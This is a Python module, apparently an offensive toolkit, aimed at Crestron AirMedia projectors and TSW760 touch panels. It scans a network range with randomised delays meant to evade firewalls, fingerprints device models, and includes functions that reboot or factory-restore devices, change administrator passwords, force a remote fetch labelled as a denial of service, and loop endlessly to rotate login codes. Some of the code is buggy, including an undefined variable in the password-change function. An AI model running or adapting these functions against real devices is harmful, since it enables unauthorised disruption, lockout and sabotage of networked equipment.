#------------------------------------------------------------------------------------
#
#	Creston Package
#
#	Contains Important Funcitons
#
#
#
#
#-----------------------------------------------------------------------------------

import requests
import ipaddress
import hashlib
import time
import random
import urllib3

urllib3.disable_warnings()

def network_scan(ip_range):
	#Create List To Hold All Possible Hosts On The Network
	allHosts=[]

	#Add All Possible Hosts To List
	for ip in ipaddress.ip_network(str(ip_range)):
		allHosts.append(ip)

	#Drop Newtork ID and Broadcast Address
	allHosts.pop(0)
	del allHosts[-1]

	#Create List To Hold Live Hosts
	onlineHosts =[]

	#Send HTTPS requests to See if port is open
	for hosts in allHosts:
		url="https://" + str(hosts) + "/"
		try:
			#Sends Rquest
			check = requests.get(url = url, timeout=5,verify=False)
			#Grabs Hash of Request
			systemOnline = hashlib.md5(check.text.encode())
			#Checks if Response is Same As Known Projector Samples
			if(systemOnline):
				print("PROJECTOR: " + url)
				onlineHosts.append(str(ipaddress.IPv4Address(hosts)))
			#Generate a random wait time
			waitTime = random.random() * 3.0
			#Wait the Random Time (This is done to try to Look less suspicious to Firewalls)
			time.sleep(waitTime)
			#Handle Any Exceptions (Generally Caused by Port being closed
		except requests.exceptions.RequestException as e:
			pass
	#Clean UP onlineHosts So Its Only IPs
	return onlineHosts

def model_type(hosts):
	#Send HTTPS requests to See if port is open
	model_dictionary = {}
	for host in hosts:
		tswURL = "http://" + host + "/webView/CommonUI"
		tswTest = requests.get(tswURL, verify=False)
		theOGurl = "http://" + host + "/cgi-bin/login.cgi?lang=en&src=AwLoginDownload.html"
		theOGTest = requests.get(theOGurl, verify=False)
		air2url = "http://" + host + "/index_airmedia.html"
		air2Test = requests.get(air2url, verify=False)
		if "var present_timeout = 1000;" in air2Test.text:
			print(host + " is a AirMedia2")
			model_dictionary[host] = 'AirMedia2'
		elif theOGTest.status_code == 200:
			print(host + " is an OG")
			model_dictionary[host] = 'OG'
		elif  "Display the application" in tswTest.text:
			print(host + " is a tsw760")
			model_dictionary[host] = 'TSW760'
		elif "DispBlock OvHidden FontLatoLight Fs30 Blue" in air2Test.text:
			print(host + " is the one we did dev for")
			model_dictionary[host] = 'Ignore'
	return model_dictionary

def og_Login(host,username,password):
	print("Trying to login now")

	#URL of Projector
	url="https://" + host + "/cgi-bin/login.cgi?lang=en&src=AwLoginAdmin.html"

	#POST Data
	data = {
		'login': 'admin',
		'account': username,
		'password': password,
		'Login.x':'56',
		'Login.y':'16'
	}

	#Send Login Request
	login = requests.post(url = url, data = data, verify=False)

	#Pull Out Cookie So You Can Keep Making Requests
	cookieStart=login.text.split("document.write(\"<form name=\'form0\' action=\'/cgi-bin/reboot.cgi?lang=en&")
	cookieMid=cookieStart[1].split("'")
	cookie=cookieMid[0]
	return cookie

def reboot(host,model,username,password):
	if model == 'TSW760':
		Data = {"Device": {"DeviceOperations": {"Reboot": "true"}}}
		reboot = requests.post(url="http://" + host + "/Device/DeviceOperations", json=Data, verify=False)
	elif model == 'OG':
		cookie = og_Login(host,username,password)
		url = "https://"+ host + "/cgi-bin/return.cgi"
		data = {
			"command" :	"<Send><seid>" + cookie + "</seid><Factory>reboot</Factory></Send>"
		}
		reboot = requests.post(url=url,data=data, verify=False)

		print("Reboot Incoming")
	else:
		pass
def restore(host,model):
	if model == 'TSW760':
		Data = {"Device": {"DeviceOperations": {"Restore": "true"}}}
		restore = requests.post(url="http://" + host + "/Device/DeviceOperations", json=Data, verify=False)
	else:
		pass

def change_pass(host, username, password, newpass):
	cookie = og_Login(host,username,password)
	#Change Pass
	url = "https://"+ host + "/cgi-bin/return.cgi"
	data = {
		"command" : "<Send><seid>" + cookie + "</seid><name>LONG_ADMIN_PWD</name><value>" + newPass + "</value></Send>"
	}
	changePass = requests.post(url=url,data=data, verify=False)
	print("Password Change Request Sent")

def web_dos(host,username,password,webserver):
	cookie = og_Login(host,username,password)

	url = "https://"+ host + "/cgi-bin/return.cgi"
	data = {
		"command" : "<Send><seid>" + cookie + "</seid><upload><protocol>http</protocol><address>" + webserver + "</address><logo>TheWeb.png</logo></upload></Send>"
	}
	remoteViewOn = requests.post(url=url,data=data, verify=False)
	print("Web Request Sent")

def code_cycle(host,username,password):
	cookie = og_Login(host,username,password)
	while True:
		randomInt = random.randint(1,9999)
		url = "https://"+ host + "/cgi-bin/return.cgi"
		data = {
			'command' : '<Send><seid>' + cookie + '</seid><name>PREF_LOGINCODE</name><value>2</value><name>PREF_UNIVERSAL_LOGINCODE</name><value>' + str(randomInt) + '</value></Send>'
		}
		cycle = requests.post(url=url,data=data, verify=False)
		print("Cycle")
